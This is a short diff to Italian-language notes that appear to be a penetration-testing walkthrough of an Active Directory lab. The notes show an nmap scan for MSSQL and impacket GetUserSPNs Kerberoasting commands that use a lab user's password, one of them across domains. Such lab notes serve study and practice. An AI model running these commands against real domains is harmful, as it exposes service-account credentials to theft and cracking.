@@ -281,8 +281,12 @@ Vediamo quali server hanno MSSQL attivo
 nmap -p 1433 -sV -sC 192.168.56.10-23
 ```
 ![[Pasted image 20230830110346.png]]
-Controlliamo se ci sono utenti con SPN sul server MSSQL
+![[Pasted image 20230830110835.png]]
+Controlliamo se ci sono utenti con SPN sui server MSSQL trovati
 ```bash
 impacket-GetUserSPNs north.sevenkingdoms.local/brandon.stark:iseedeadpeople
 ```
 ![[Pasted image 20230830104754.png]]
+```bash
+GetUserSPNs.py -target-domain essos.local north.sevenkingdoms.local/brandon.stark:iseedeadpeople
+```
